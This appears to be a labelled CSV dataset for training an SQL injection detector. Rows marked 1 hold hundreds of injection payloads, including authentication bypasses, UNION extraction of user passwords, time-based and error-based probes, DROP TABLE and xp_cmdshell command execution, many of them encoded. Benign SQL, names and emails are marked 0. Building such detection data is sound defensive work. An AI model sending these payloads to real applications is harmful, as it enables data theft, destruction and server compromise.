Sentence,Label
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1#/* OR 1=15",1
1' OR '1'='1' --#57 OR 1=1##,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1524,1
SELECT * FROM dog,0
SELECT dish ( s )  FROM jet,0
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408304 AND 1=1",1
SELECT society ( s )  FROM flight UNION ALL,0
SELECT manufacturing ( s )  FROM nearest LEFT JOIN,0
"""%20or%201=1# AND 1=1704",1
14602519a,0
"1' UNION SELECT username,password FROM users-- AND 1=1595",1
""")%20OR%20(""1""=""1",1
"1' AND BENCHMARK(10000000,MD10('A'))-- AND 1=1522",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423 AND 1=1",1
SELECT last ( s )  FROM bank UNION ALL,0
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#612",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784 OR 1=1 AND 1=1",1
SELECT * FROM finger WHERE magnet NOT BETWEEN 'common' AND 'lucky',0
SELECT * FROM exciting WHERE region IN  ( SELECT stuck FROM appropriate ) ,0
SELECT DISTINCT satisfied FROM book,0
')%20OR%201=1--/*,1
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1912",1
"paseo mokamer, s/n,",0
"1"";%20WAITFOR%20DELAY%20""00:00:05""--12640",1
admin0x27/*467468 OR 1=1708995--,1
"   SELECT breakfast, proud+ ', ' + label+ ' ' + got+ ', ' + some AS neck  FROM bark",0
"   SELECT COUNT ( along ) , operation FROM seems BY middle",0
test1' OR '1' = '1/*#632/*--,1
16582,0
correa cachopo,0
SELECT halfway ( s )  FROM correct,0
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197#",1
SELECT TOP 50 PERCENT * FROM limited,0
user' OR '1'='1#315-- AND 1=1/*619473,1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*374323",1
' or 99=99-- OR 1=1,1
"'%09UNION%09SELECT%09username,password%09FROM%09users----/*800",1
SELECT * FROM state WHERE dream = 'plates'  OR as = 'element',0
"1"" UNION SELECT NULL,NULL------611--306493909",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67987",1
'/**/OR/**/'1'='1'/**/--38#,1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708--",1
""" OR 1=1/*--929888175#659",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1723#,1
napolen,0
user' UNION ALL SELECT NULL--/*/* OR 1=1,1
"""+OR+""1""=""1--",1
admin0x27/*467468 OR 1=1708995,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 53820 )  ORDER BY meta_id ASC",0
' OR '2'='213973 AND 1=1--53 AND 1=1 OR 1=1 OR 1=1,1
"test' UNION SELECT 1,2,3--/*#974#637",1
SELECT * FROM slightly WHERE mixture = 'she' LIMIT 3,0
SELECT * FROM load WHERE proper NOT LIKE 'line%',0
"""%09or%091=1# AND 1=1 OR 1=1691449626 OR 1=1--",1
"user"" UNION SELECT NULL--/*583115",1
valimir,0
1%27%3B%20INSERT%20INTO%20users%20VALUES%28%27hacked%27%2C%27pass%27%29--#804192--,1
SELECT * FROM door WHERE    NOT pleasant = 'local',0
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520/*159,1
SELECT image,0
walborn@19horas.cat,0
"admin1"" OR ""1"" = ""1# OR 1=1538",1
"test' UNION SELECT 1,2,3-- OR 1=1574769",1
SELECT COUNT ( DISTINCT serve )  FROM completely,0
admin'%20OR%20'1'='1 AND 1=1987656414732,1
SELECT * FROM poor WHERE whole = 'firm' FETCH FIRST 3 ROWS ONLY,0
test' OR '1'='1-- OR 1=1733922 AND 1=1,1
admin' UNION ALL SELECT NULL--892 OR 1=1957622,1
0x27 OR 0x2710x27=0x2710x27 --933,1
7e2hered0962n,0
""" AND updatexml(2,concat(0x7e,version()),2)--",1
SELECT * FROM  ( SELECT interior FROM unusual ) ,0
SELECT COUNT ( education ) FROM memory,0
' UNION SELECT NULL--/*622/*427/*515146 OR 1=1,1
') OR ('1'='1/* OR 1=1--326,1
"'%09UNION%09SELECT%09NULL,NULL--/*",1
admin'%20OR%20'1'='1479,1
1%27%20OR%20%271%27%20%3D%20%271/*403612,1
2'; DROP TABLE users--713 OR 1=1,1
""" OR 1=1#-- OR 1=1#80585 OR 1=1",1
34481916v,0
1admin' OR '1'='1/*/*403,1
"user"") OR (""1""=""1--#--",1
' AND 1=CAST((SELECT @@version) AS int)--/*423--,1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1346 AND 1=1--,1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348154523,1
ketley,0
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878 OR 1=184",1
""" union select null,null,null--860 AND 1=1# AND 1=1",1
' OR '1'='1#474953313,1
';%20EXEC%20xp_cmdshell('dir')--# AND 1=1202/* OR 1=1791,1
ADMIN'/*172620849210,1
SELECT pie ( s )  FROM ran UNION ALL,0
""")+OR+(""1""=""1 AND 1=1875#833",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1372--",1
SELECT * FROM proud WHERE price = 'luck' LIMIT 3,0
SELECT moving ( s FROM none RIGHT JOIN,0
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*917324",1
1' OR 'a'='a544#80 AND 1=1238,1
5838990000000000,0
""";%09EXEC%09xp_cmdshell(""dir"")-- AND 1=1 AND 1=1",1
a0_idia,0
1%27%20OR%20%271%27%20%3D%20%271/*191,1
quicena,0
user' OR '1'='1#315-- AND 1=1827,1
') OR ('1'='1/* AND 1=1967#916,1
"ADMIN""/*172871638416",1
admin1' OR '1' = '1--/*603#937149/*,1
' OR '1'='1' --/*532,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518231 AND 1=1649 OR 1=1",1
valverde de los arroyos,0
'+OR+1=1#/*160/*,1
boget brufau,0
"""%20or%201=1# AND 1=1 OR 1=1# AND 1=1 AND 1=1",1
';+EXEC+xp_cmdshell('dir')-- AND 1=1471#,1
SELECT * FROM in WHERE behavior = 'heart' LIMIT 3,0
"user' UNION SELECT username,password FROM users------ OR 1=1",1
user') OR 1=1-- AND 1=1882350307#754,1
junette6,0
admin' UNION ALL SELECT NULL--24127795,1
admin1' OR '1' = '1--/*603#937272416,1
"11' UNION SELECT NULL,table_name FROM information_schema.tables----",1
admin1' OR '1' = '1--/*/*814-- OR 1=1145,1
1' OR '1'='1 OR 1=1 AND 1=128,1
stetson,0
navalmoral de bjar,0
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598 OR 1=1 AND 1=1",1
mayolas,0
"""+OR+""1""=""1--77 OR 1=1534",1
SELECT * FROM strike FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM breathe,0
'/**/OR/**/'1'='1459,1
SELECT * FROM young WHERE attention  BETWEEN 10 AND 20,0
"1'%09UNION%09SELECT%09NULL,table_name%09FROM%09information_schema.tables--567",1
SELECT * FROM trace WHERE cutting NOT LIKE 'beyond%',0
testadmin' OR '1'='1 AND 1=1613186,1
16741,0
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1 AND 1=1 AND 1=1",1
SELECT * FROM student WHERE wash BETWEEN '1996-07-01' AND '1996-07-31',0
user') OR ('1'='1 AND 1=1 AND 1=1 OR 1=1/*,1
admin' OR 1=1/*## OR 1=1349,1
' UNION SELECT NULL--/*,1
"1"" and pg_sleep(5)--634",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1750",1
"ADMIN""/*172247 AND 1=1645287693",1
""")+OR+(""1""=""1-- AND 1=1 AND 1=1 OR 1=1#",1
' UNION SELECT NULL--/*622/*427/*25640--,1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 AND 1=1805,1
0x27; DROP TABLE users--15278,1
SELECT * FROM acres WHERE began = 'who' FETCH FIRST 3 ROWS ONLY,0
'+OR+1=1#/*#----,1
testadmin' OR '1'='1 AND 1=1 OR 1=1 OR 1=1/* AND 1=1/* OR 1=1,1
1admin' OR 1=1--#951359--,1
"admin"") OR (""1""=""1# OR 1=160148 AND 1=1",1
"1'; INSERT INTO users VALUES('hacked','pass')--739--353#612--",1
"admin"" OR 1=1/*##487/*",1
"  SELECT * FROM fat WHERE practice IN  ( 'fifteen', 'wall', 'ear' )  ",0
1729,0
SELECT * FROM her FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM driving,0
') OR ('1'='1/* OR 1=1293408/*,1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1",1
"   SELECT event,charge,parts,explore,accident     (  (  carry JOIN location ON event.if =  jet.coast )   INNER JOIN environmentON Orders.rice =  lot.sawID ) ",0
4la3ue95,0
"1""/**/AND/**/SLEEP(5)--590",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables---- AND 1=1 AND 1=1421",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278--",1
SELECT * FROM read 3 SELECT * FROM because,0
4089,0
"admin' UNION SELECT NULL,NULL,NULL--/*#--705",1
"admin"" UNION SELECT NULL,NULL--181885847",1
91494736t,0
"1"" UNION SELECT NULL----159667--367",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851#",1
'; UPDATE USERS SET PASSWORD='HACKED'--691 OR 1=1,1
SELECT TOP 3 * FROM wheat WHERE along = 'swept',0
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=197739",1
"  SELECT * FROM simply WHERE rush NOT IN  ( 'pride', 'general', 'hold' )  ",0
'/**/or/**/1=1/*135540 OR 1=1907/*,1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309484,1
"""/**/OR/**/1=1-- OR 1=1/*857524",1
user' OR 1=1--/* OR 1=1 OR 1=1#,1
'+OR+'1'='1--549 OR 1=1997 OR 1=1,1
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=1 OR 1=1-- OR 1=1/*",1
') OR ('1'='1/* OR 1=1--326 AND 1=1250--#,1
"1';/**/INSERT/**/INTO/**/users/**/VALUES('hacked','pass')-- AND 1=1",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306587473",1
"1"" AND BENCHMARK(5000000,MD5(""A""))--",1
%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--184/*,1
test' OR '1'='1' /*# OR 1=1 OR 1=1,1
"1"" UNION SELECT NULL----159334593 AND 1=1",1
user' OR '1'='1#315-- AND 1=1/*619202304,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/*#,1
"plza. santa marina, s/n, 12?h",0
0x27; DROP TABLE users--15667 AND 1=1,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788193",1
"admin' UNION SELECT username,password FROM users----538831",1
"testadmin"" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1248",1
ADMIN'/*--672--492,1
lacavex lafont,0
' OR '2'='213/*#942 OR 1=1,1
admin'%20OR%20'1'='1434 OR 1=1,1
"""%20or%201=1/*835/*549 AND 1=1",1
"' union select null,null,null--# AND 1=1436",1
belva,0
"useradmin"" OR 1=1--#297",1
"INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )  ",0
' OR 1=1#---- OR 1=1844--,1
'%09UNION%09ALL%09SELECT%09NULL-- OR 1=1#/*#,1
1' anD pg_sLeep(5)--,1
admin' UNION ALL SELECT NULL-- AND 1=1-- OR 1=1156,1
SELECT * FROM one FETCH FIRST 3 ROWS ONLY,0
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1298226",1
"admin"" UNION SELECT NULL-- AND 1=1#645 OR 1=1",1
guillen,0
"user"" UNION SELECT NULL-- AND 1=1/*",1
1' OR '1' = '1 AND 1=1 AND 1=1/*702599,1
ADMIN'/* AND 1=1911 AND 1=110515794,1
'%20or%201=1/*83525738383159988 OR 1=1/*,1
test' OR 1=1##/* OR 1=1-- OR 1=1 AND 1=1111,1
barcones,0
"admin"" UNION SELECT NULL,NULL-- AND 1=1#952",1
pangborne@europop.mw,0
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/*--",1
"1""%09AND%09pg_sleep(5)--860 OR 1=1258",1
despacha!do,0
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1446,1
"  SELECT DAY ( ""2017-06-15"" ) ;",0
SELECT AVG ( plus )  FROM dirt  SELECT SUM ( dropped ) ,0
calle el milagrena s/n 10a,0
"'%09UNION%09SELECT%09NULL,NULL--21776",1
SELECT * FROM  ( SELECT powerful FROM everyone ) ,0
"SELECT CONV ( 88, 10, 16 ) ; ",0
""" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1939",1
SELECT * FROM fun WHERE    NOT travel = 'pair',0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1708562",1
"admin"" OR 1=1--/*",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815--",1
"test"" OR ""1""=""1 AND 1=1",1
admin0x27/* OR 1=1 AND 1=129891290,1
"SELECT * FROM twice WHERE tropical BETWEEN ""bow"" AND    ""dress""",0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*--713",1
0x27 UNION ALL SELECT NULL--415482/*# AND 1=1/*,1
"user' UNION SELECT username,password FROM users----963",1
"user"" UNION SELECT NULL,NULL--/*958",1
'; UPDATE users SET password='hacked'--235#,1
"' union select null,null,null--# AND 1=1--491 OR 1=1510696",1
reconfortante,0
'/**/OR/**/'1'='1'/**/--/*75#278,1
1' OR '1'='1 OR 1=1257--5705043,1
1' OR '1' = '1 AND 1=1566123,1
admin' OR 1=1-- OR 1=1199548,1
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--282237",1
'+OR+'1'='1-- AND 1=1296,1
SELECT getting,0
"INSERT INTO creature ( finest, tin, till, fort, pilot, term )  VALUES  ( 'cup', 'were'. tone', 'yard', 'creature', 'sick', 'till' )  ",0
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520,1
'+OR+1=1--156/*437189,1
1' OR '1'='1' --#412640121,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--#/* AND 1=1734 OR 1=1",1
1%27%20OR%20%271%27%20%3D%20%271 OR 1=1 AND 1=1297 OR 1=1,1
SELECT * FROM large 3 SELECT * FROM stone,0
""") OR (""1""=""1/* OR 1=1293591",1
SELECT * FROM station WHERE stranger = 'afraid' LIMIT 3,0
user' OR 1=1/*/* AND 1=1/*----,1
' OR '2'='213/* OR 1=1,1
"user"") OR (""1""=""1 AND 1=19",1
38847166m,0
test' UNION SELECT NULL----#/*,1
SELECT * FROM increase WHERE discovery LIKE '%make%',0
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761",1
'/**/OR/**/1=1-- OR 1=1/*,1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,0
admin1' OR '1' = '1--/*/*814-- OR 1=1892,1
SELECT * FROM gone WHERE around = 'bear' LIMIT 3,0
zulmara,0
56163821y,0
vingelli9@custombikesclothes.fr,0
"""/**/OR/**/1=1-- OR 1=1876--/*",1
1' OR '1'='1' --/*#987 AND 1=1,1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1991,1
1') OR ('1'='1,1
"  SELECT MAKETIME ( 11, 35,   4 ) ;",0
user' OR 1=1--/* OR 1=178599 OR 1=19,1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108652,1
SELECT * FROM pen FETCH FIRST 50 PERCENT ROWS ONLY,0
admin1' OR '1' = '1--/*603 AND 1=1/*,1
' OR '2'='213973 AND 1=1--53 OR 1=1211,1
berleand@campanasextractoras.la,0
"  SELECT * FROM change WHERE newspaper IN  ( 'caught', 'ahead', 'pie' )  ",0
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343234 OR 1=1",1
""" OR ""1""=""1 AND 1=1395454 OR 1=1",1
FROM  ( SELECT DISTINCT basket FROM usual ) ,0
"admin' UNION SELECT 1,2,3----811-- OR 1=1--920",1
admin'/**/OR/**/1=1-- OR 1=1402 OR 1=1--,1
SELECT * FROM nearly,0
"1""%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#/*",1
test' OR '1'='1' /*#666--78293981,1
"1"" OR ""1""=""1"" --#57 OR 1=1657",1
 UPDATE by SET rather = 'adjective'WHERE too = 'interest',0
' OR '2'='213973986,1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380#484,1
')+OR+('1'='1 AND 1=1665,1
"INSERT INTO powder  ( tonight, supper, larger )  VALUES  ( 'minute', 'spirit', 'characteristic' )  ",0
"test"" UNION SELECT NULL,NULL--/* AND 1=1586 OR 1=1",1
5h5c8,0
"ADMIN""/*172 OR 1=1",1
saprtich@seramitex.sv,0
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1139",1
admin' OR '1'='1946#540--,1
%27%20OR%20%27a%27%3D%27a/*--#631,1
"admin' UNION SELECT username,password FROM users-- AND 1=1/*",1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1677 AND 1=1",1
aguistin,0
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=170437368",1
ADMIN'/* AND 1=1/* OR 1=1,1
' OR '1'='1#474157,1
admin'%20OR%20'1'='1 AND 1=1987656317,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1 AND 1=1 OR 1=1--776",1
' OR '2'='213973 AND 1=1596,1
' AND 1=CAST((SELECT @@version) AS int)--/*423848# OR 1=1,1
' OR '2'='213973 AND 1=1--53 AND 1=1140,1
"""+UNION+SELECT+NULL--608168# OR 1=1",1
"user"") OR 1=1-- AND 1=1/* OR 1=1514",1
"c/ jose belso castao, s/n,",0
""")+OR+(""1""=""1 AND 1=1",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278# OR 1=1",1
admin' OR 1=1/*#104116,1
"test"") OR 1=1--/* OR 1=1449",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--811",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166566",1
" SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ; ",0
'%20or%201=1#667--729963,1
h958013a,0
SELECT COUNT ( DISTINCT afraid )  FROM stock,0
1%27%3B%20DROP%20TABLE%20users--/*277/*,1
"SELECT CustomerName, ContactName FROM Customers WHERE Country  =  ""Brazil""; CREATE OR REPLACE VIEW [Brazil Customers] AS ",0
cresta-da,0
"' UNION SELECT username,password FROM users--/* OR 1=1/*",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1--247810561# AND 1=1960",1
' AND 1=CAST((SELECT @@version) AS int)--/*423848474,1
admin' OR 2=2--925348 OR 1=142,1
SELECT * FROM capital  WHERE heard = judge,0
SELECT COUNT ( sail )  FROM traffic,0
'/**/or/**/1=1/*135540 OR 1=1907433,1
SELECT * FROM explanation WHERE stronger BETWEEN earn09/01/1996folks AND powder15/31/1996flies,0
SELECT * FROM turn FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM stood,0
admin' OR '99'='99/*,1
"test"" OR ""1""=""1/* OR 1=1292",1
"' union select null,null,null--# AND 1=1--682 OR 1=1379 OR 1=1",1
SELECT TOP 3 * FROM beautiful,0
SELECT * FROM roll FETCH FIRST 50 PERCENT ROWS ONLY,0
"user"" UNION SELECT NULL,NULL--/* OR 1=1 OR 1=1/*371",1
1%27%3B%20DROP%20TABLE%20users--/*586 OR 1=1,1
SELECT usually,0
admin' UNION SELECT NULL-- AND 1=1#645/*735909660,1
1'%09AND%09pg_sleep(5)--860 OR 1=1 AND 1=1,1
'%09OR%091=1--#428#,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1/*518",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1/* AND 1=1--,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168521",1
' OR '2'='213973 AND 1=1--53 AND 1=1 OR 1=1/*925,1
1' OR 'a'='a OR 1=1#38688/*--,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--/*",1
07383536f,0
"user"" UNION SELECT NULL,NULL--/* OR 1=1 OR 1=1",1
" SELECT * FROM hurt ORDER BY bound, ride",0
"admin"" OR ""1""=""195862#",1
SELECT * FROM into WHERE feet = 'ice'  OR chosen = 'skin',0
"1"" OR ""1""=""1/* AND 1=1 OR 1=1/* OR 1=1659--#",1
"admin1"" OR ""1"" = ""1--/*737#41",1
10x27; WAITFOR DELAY 0x2700:00:050x27----#,1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1372 OR 1=1",1
user' OR 1=1--/* OR 1=178/* OR 1=1,1
"admin1"" OR 1 = 1 AND 1=1-- AND 1=1",1
' OR 1=1--#/*,1
7548040000000000,0
SELECT negative ( s )  FROM various,0
"1""+OR+1+=+1351888387 OR 1=1#",1
'/**/OR/**/'a'='a922980622971/*381932,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679664333",1
SELECT TOP 3 * FROM pile SELECT * FROM sad 3SELECT * FROM family,0
SELECT MIN ( customs )  AS telephone FROM zipper,0
1' UNION SELECT NULL----159719,1
fitness,0
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#458/*833,1
test1' OR '1' = '1/*#63257751370,1
420136000000000,0
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166556636",1
37609,0
"testadmin"" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1389",1
1.89129E+015,0
0x27; DROP TABLE users--15667855,1
"  SELECT partly,roll FROM government WHERE thing = 'five' UNION SELECT help, doing FROM farmer",0
"user"" OR ""1""=""1#-- OR 1=1 OR 1=1773",1
SELECT heat ( s )  FROM flies,0
victoria,0
user') OR 1=1-- AND 1=1882350307# OR 1=1745,1
" SELECT * FROM police ORDER BY forward ASC, than DESC",0
"""/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))-- OR 1=1 OR 1=1775",1
"  UPDATE group SET tongue =  'bus', City =  'directly' WHERE we =  seen",0
SELECT * FROM rich WHERE seven NOT LIKE 'theory%',0
'%20UNION%20ALL%20SELECT%20NULL--908833,1
1' UNION SELECT NULL----395583#,1
SELECT * FROM sun WHERE that = 'window' LIMIT 3,0
lacey@bwds.mp,0
maren-bufford4@fruteriacartaya.yu,0
"admin"") OR (""1""=""1# OR 1=1/*/*--",1
SELECT * FROM pool FETCH FIRST 3 ROWS ONLY,0
"admin1"" OR 1 = 1--",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=133# OR 1=1,1
"admin' UNION SELECT NULL,NULL,NULL--/*#444253",1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#359",1
SELECT COUNT ( DISTINCT community )  FROM highway,0
') OR ('1'='1/* OR 1=1--326 AND 1=1250--318,1
admin0x27/* OR 1=1 AND 1=1298912/*,1
'/**/OR/**/1=1-- OR 1=1 AND 1=1 OR 1=1 AND 1=1,1
11' OR 1 = 1/*--7,1
"test' UNION SELECT 1,2,3--/* AND 1=1",1
SELECT COUNT ( tears ) FROM might,0
""";%20EXEC%20xp_cmdshell(""dir"")--591 AND 1=1108",1
test1' OR 1 = 1#164,1
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1 AND 1=1/*",1
silvita,0
test1' OR '1' = '1#,1
DELETE FROM how,0
1' OR 1=1#-- AND 1=1602,1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1696803",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/* OR 1=1742847,1
"   SELECT please,black,apart,leader,conversation     (  (  wonder JOIN beginning ON angle.zebra =  cattle.chicken )   INNER JOIN objectON Orders.office =  natural.haveID ) ",0
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=1174 OR 1=1 OR 1=1",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1915",1
dannies,0
' OR 1=1#----#184137 AND 1=1,1
"admin1"" OR 1 = 1 AND 1=1#",1
tanchak,0
'/**/OR/**/'1'='1'/**/--478,1
"1"" UNION SELECT NULL,NULL------611--/*821272",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977 AND 1=1185",1
' OR '2'='213973 AND 1=1--53,1
"ADMIN""/*17253168 OR 1=1",1
SELECT * FROM man  WHERE have = closely,0
"admin"" OR 2=2--925348",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1--",1
saya,0
2569,0
SELECT TOP 3 * FROM been,0
SELECT AVG ( all )  FROM these  SELECT SUM ( jump ) ,0
admin' UNION SELECT NULL-- AND 1=1#645/* OR 1=1431580,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1 OR 1=1/*",1
9004540000000000,0
"1"" UNION SELECT NULL----159334593107 AND 1=1/*#",1
useradmin' OR 1=1--#/*606171840,1
SELECT * FROM hold 3 SELECT * FROM statement,0
"1"" UNION SELECT NULL----159334593107 AND 1=1 OR 1=1633",1
1'%09OR%09'1'%09=%09'199884#,1
SELECT * FROM distance FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM see,0
"INSERT INTO page  ( flew, reach, printed )  VALUES  ( 'baby', 'bush', 'unhappy' )  ",0
1' OR 1=1#/*/*918 OR 1=1,1
1' OR '1' = '1,1
admin' UNION ALL SELECT NULL--24127474161690#,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--743209",1
"1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1 OR 1=1#731105778",1
corrius,0
plang_schallert@white-pearl-resort.kp,0
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*-- AND 1=1 OR 1=1",1
test' OR '1'='1' /*#666--672#,1
ralf,0
SELECT AVG ( Price ) FROM drink,0
SELECT very ( s FROM slightly RIGHT JOIN,0
SELECT TOP 50 PERCENT * FROM frame SELECT * FROM member FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM toward,0
"admin' UNION SELECT NULL,NULL--897514154 OR 1=1 OR 1=1#",1
"""%20or%201=1#428/*61662",1
user1' OR 1 = 1----,1
grimm@madrid2012.nu,0
1'%20OR%201%20=%201128,1
""" OR ""1""=""1 AND 1=1 OR 1=144#",1
' OR '2'='213/*# OR 1=1822 AND 1=1 AND 1=1,1
SELECT * FROM purple 3 SELECT * FROM likely,0
SELECT * FROM fewer ORDER BY suddenly,0
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#683,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----#939,1
SELECT * FROM war WHERE    NOT rising = 'frame',0
' or 2=2/* AND 1=1/*32,1
"user"" OR 1=1/* AND 1=1--#",1
'/**/OR/**/1=1-- OR 1=1 AND 1=1636697,1
' OR '2'='2 AND 1=1 AND 1=1--173--913302,1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1 AND 1=1572#,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1418",1
trixy,0
ha3fila,0
'+OR+1=1#/*-- AND 1=1 OR 1=1,1
admin' OR '1'='1' /*/*497425,1
